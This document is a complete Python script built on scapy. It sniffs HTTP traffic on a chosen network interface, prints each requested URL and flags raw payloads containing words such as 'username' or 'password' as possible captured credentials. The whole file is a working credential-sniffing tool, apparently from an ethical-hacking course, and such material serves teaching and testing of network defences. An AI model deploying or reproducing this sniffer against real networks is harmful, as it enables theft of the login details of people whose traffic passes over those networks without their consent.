#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to capture packets")
    arguments = parser.parse_args()
    if not arguments.interface:
        parser.error("[-] Please enter a target client ")
    return arguments

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "username", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        load = get_login_info(packet)
        if load:
            print("\n\n\n[+] Posibble username/password found >> " + load + "\n\n\n")

arguments = get_arguments()
interface = arguments.interface
sniff(interface)
